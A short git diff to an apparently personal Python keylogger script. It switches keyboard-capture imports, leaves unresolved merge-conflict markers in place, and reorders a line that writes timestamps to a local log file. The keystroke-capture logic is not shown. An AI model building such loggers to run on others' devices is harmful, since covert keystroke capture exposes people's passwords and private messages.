@@ -4,8 +4,12 @@
     The goal is to log key strokes with the date and time for each sentence.
 
 """
+<<<<<<< HEAD
 
 from pynput import keyboard
+=======
+import keyboard as key
+>>>>>>> 24f15f2bc47e08a91518e0fb4c8433addc95d3b5
 import numpy as np
 from datetime import datetime as t
 
@@ -44,9 +48,9 @@ with open("/home/bladerunner/Documents/python/keylogger/log.txt",'a') as logging
     current_t = now.strftime("[%H:%M:%S]: ")
     
     # This appends to a file.
-    logging.write("\n")
     logging.write(current_dt)
     logging.write("First line contains")
+    logging.write("\n")
 
 
 
